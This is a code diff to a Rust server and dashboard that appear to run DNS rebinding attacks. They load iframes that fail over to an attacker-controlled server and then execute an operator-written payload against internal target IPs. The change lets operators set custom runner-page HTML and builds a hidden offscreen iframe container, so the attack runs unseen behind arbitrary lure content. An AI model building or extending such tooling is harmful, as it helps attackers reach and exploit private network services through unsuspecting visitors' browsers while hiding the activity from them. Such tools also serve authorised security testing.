@@ -203,6 +203,7 @@ pub async fn serve_content(
         .route("/", get(dashboard))
         .route("/api/projects", get(api_list))
         .route("/api/defaults", get(api_defaults))
+        .route("/api/runner-template", get(api_runner_template))
         .route("/api/deploy", get(api_deploy))
         .route(
             "/api/project/:name",
@@ -245,6 +246,8 @@ struct ProjectBody {
     pad: usize,
     #[serde(default)]
     payload: String,
+    #[serde(default)]
+    runner_html: String,
 }
 
 async fn api_list() -> Json<Vec<String>> {
@@ -253,6 +256,12 @@ async fn api_list() -> Json<Vec<String>> {
 
 async fn api_defaults(State(s): State<MasterState>) -> Json<Project> {
     Json(Project::default_from_env("", &s.default_payload))
+}
+
+/// The default runner page HTML, so the dashboard can pre-fill the editor when
+/// an operator wants to customize it.
+async fn api_runner_template() -> &'static str {
+    project::DEFAULT_RUNNER_HTML
 }
 
 async fn api_deploy(State(s): State<MasterState>) -> Json<serde_json::Value> {
@@ -281,6 +290,7 @@ async fn api_save(
         stop_seconds: body.stop_seconds.min(20),
         pad: body.pad.min(project::MAX_PAD),
         payload: body.payload,
+        runner_html: body.runner_html,
     };
     project::save(&project).map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?;
     *s.active.write().unwrap() = project.clone();
@@ -456,8 +466,41 @@ const RUNNER_INVALID_HTML: &str = "<!doctype html><meta charset=\"utf-8\">\
 /// from the environment; the targets/stop window come from the session's project
 /// snapshot. `rid` is the report ID this runner posts its results back under.
 fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
-    let server_ip = deploy.server_ip;
+    let script = render_runner_script(project, deploy, rid);
+    let html = project
+        .runner_html_or_default()
+        .replace(project::RUNNER_NAME_MARKER, &html_escape(&project.name));
+    if html.contains(project::RUNNER_SCRIPT_MARKER) {
+        html.replace(project::RUNNER_SCRIPT_MARKER, &script)
+    } else {
+        // Custom page omitted the marker: inject the orchestration script
+        // before </body> (or at the end) so the rebind still runs.
+        match html.rfind("</body>") {
+            Some(i) => format!("{}{}{}", &html[..i], script, &html[i..]),
+            None => format!("{html}{script}"),
+        }
+    }
+}
+
+/// Minimal HTML escaping for text interpolated into the runner page.
+fn html_escape(s: &str) -> String {
+    s.replace('&', "&amp;")
+        .replace('<', "&lt;")
+        .replace('>', "&gt;")
+        .replace('"', "&quot;")
+}
+
+/// Render the `<script>` that drives the rebind: builds one iframe per target,
+/// pings them until they fail over to our server, calls `/stop`, then signals
+/// the frames to execute the payload. Injected into the runner page in place of
+/// the `{{REBIND_SCRIPT}}` marker. The script is resilient to custom runner
+/// pages that drop the `#frames`/`#log` elements (it creates a hidden frames
+/// container when one is missing), so the rebind runs behind arbitrary content.
+fn render_runner_script(project: &Project, deploy: &Deploy, rid: &str) -> String {
+    let server_ip = deploy.server_ip.to_string();
     let standard_port = deploy.standard_port;
+    let hostname = &deploy.hostname;
+    let stop_seconds = project.stop_seconds_clamped();
     let targets_js = project
         .target_ips()
         .iter()
@@ -466,32 +509,7 @@ fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
         .join(",");
 
     format!(
-        r#"<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>rebind :: runner</title>
-<style>
-  body {{ font-family: system-ui, sans-serif; margin: 1.5rem; }}
-  #log {{ white-space: pre-wrap; font-family: monospace; background:#111; color:#0f0;
-          padding:1rem; border-radius:6px; min-height:8rem; }}
-  iframe {{ width: 360px; height: 70px; border: 1px solid #ccc; margin: 4px; }}
-  .frame-label {{ font-family: monospace; font-size: 12px; color:#555; }}
-  a {{ color:#06c; }}
-</style>
-</head>
-<body>
-  <h1>rebind runner &mdash; project: {project_name}</h1>
-  <p>One iframe per target. Each loads
-     <code>&lt;target_ip&gt;.&lt;random&gt;.{hostname}</code>; the DNS server adds
-     this server's IP to the answer (from config), so the browser lands here
-     first. The master pings each frame; frames that don't pong are reloaded
-     with a fresh random label until they point at this server.</p>
-  <div id="frames"></div>
-  <h2>Log</h2>
-  <div id="log"></div>
-
-<script>
+        r#"<script>
 const HOSTNAME      = {hostname:?};
 const SERVER_IP     = {server_ip:?};
 const STANDARD_PORT = {standard_port};
@@ -519,7 +537,25 @@ const EXECUTE_DELAY = 600;
 
 const PORT_SUFFIX = STANDARD_PORT === 80 ? "" : ":" + STANDARD_PORT;
 const logEl = document.getElementById('log');
-function log(m) {{ logEl.textContent += m + "\n"; console.log(m); }}
+function log(m) {{ if (logEl) logEl.textContent += m + "\n"; console.log(m); }}
+
+// Resolve the iframe host container. Custom runner pages may omit #frames; in
+// that case create a hidden one so the rebind frames still load offscreen.
+function framesContainer() {{
+  let c = document.getElementById('frames');
+  if (!c) {{
+    c = document.createElement('div');
+    c.id = 'frames';
+    c.style.position = 'fixed';
+    c.style.left = '-9999px';
+    c.style.top = '0';
+    c.style.width = '1px';
+    c.style.height = '1px';
+    c.style.overflow = 'hidden';
+    document.body.appendChild(c);
+  }}
+  return c;
+}}
 
 function rnd() {{ return "r" + Math.random().toString(36).slice(2, 10); }}
 function hostFor(t) {{ return t.label + "." + rnd() + "." + HOSTNAME; }}
@@ -529,7 +565,7 @@ let executed = false;
 const frames = [];
 
 function build() {{
-  const container = document.getElementById('frames');
+  const container = framesContainer();
   if (!TARGETS.length) {{ log("no targets configured for this project"); return; }}
   TARGETS.forEach((t, i) => {{
     const f = {{ id: i, target: t, host: hostFor(t), confirmed: false,
@@ -620,16 +656,8 @@ async function onAllConfirmed() {{
 build();
 setTimeout(tick, 500);
 </script>
-</body>
-</html>
 "#,
         project_name = project.name,
-        hostname = deploy.hostname,
-        server_ip = server_ip.to_string(),
-        standard_port = standard_port,
-        stop_seconds = project.stop_seconds_clamped(),
-        targets_js = targets_js,
-        rid = rid,
     )
 }
 
@@ -693,6 +721,12 @@ const DASHBOARD_HTML: &str = r##"<!doctype html>
           <input id="stop" type="number" min="0" max="20"></label>
         <label>DNS padding <small>(extra server-IP records returned alongside the target; the server IP is always included once; max 16)</small>
           <input id="pad" type="number" min="0" max="16"></label>
+        <label>Runner page HTML
+          <small>(the page hosting the rebind iframes; leave blank for the default).
+          <code>{{REBIND_SCRIPT}}</code> is replaced by the rebinding script (appended before
+          <code>&lt;/body&gt;</code> if you omit it); <code>{{PROJECT_NAME}}</code> by the project name.</small>
+          <textarea id="runner_html" rows="14" placeholder="(blank = default runner page)"></textarea></label>
+        <p><button type="button" id="loadtemplate">Load default template</button></p>
       </details>
       <label>Payload &mdash; <code>async function runPayload(rebind)</code>
         <textarea id="payload" rows="16"></textarea></label>
@@ -739,6 +773,7 @@ function readForm() {
     stop_seconds: Math.min(20, parseInt($("stop").value, 10) || 0),
     pad: Math.min(16, Math.max(0, parseInt($("pad").value, 10) || 0)),
     payload: $("payload").value,
+    runner_html: $("runner_html").value,
   };
 }
 
@@ -748,6 +783,17 @@ function fillForm(p) {
   $("stop").value = p.stop_seconds ?? 5;
   $("pad").value = p.pad ?? 0;
   $("payload").value = p.payload || "";
+  $("runner_html").value = p.runner_html || "";
+}
+
+async function loadRunnerTemplate() {
+  if ($("runner_html").value.trim() &&
+      !confirm("Replace the current runner HTML with the default template?")) return;
+  try {
+    $("runner_html").value = await api("GET", "/api/runner-template");
+    $("advanced").open = true;
+    status("Loaded default runner template. Edit and Save to apply.");
+  } catch (e) { status(String(e)); }
 }
 
 async function refreshProjects() {
@@ -927,7 +973,8 @@ async function save() {
   if (!p.name) { status("Please set a project name (letters, digits, - and _ only)."); return; }
   try {
     const saved = await api("POST", "/api/project/" + encodeURIComponent(p.name),
-                            { targets: p.targets, stop_seconds: p.stop_seconds, pad: p.pad, payload: p.payload });
+                            { targets: p.targets, stop_seconds: p.stop_seconds, pad: p.pad,
+                              payload: p.payload, runner_html: p.runner_html });
     await refreshProjects();
     $("activename").textContent = saved.name;
     status("Saved & activated: " + saved.name);
@@ -946,6 +993,7 @@ async function init() {
   $("savebtn").onclick = save;
   $("activatebtn").onclick = activate;
   $("activaterunner").onclick = activateRunner;
+  $("loadtemplate").onclick = loadRunnerTemplate;
   $("refreshreports").onclick = loadReports;
   $("clearreports").onclick = clearReports;
   await loadDeploy();
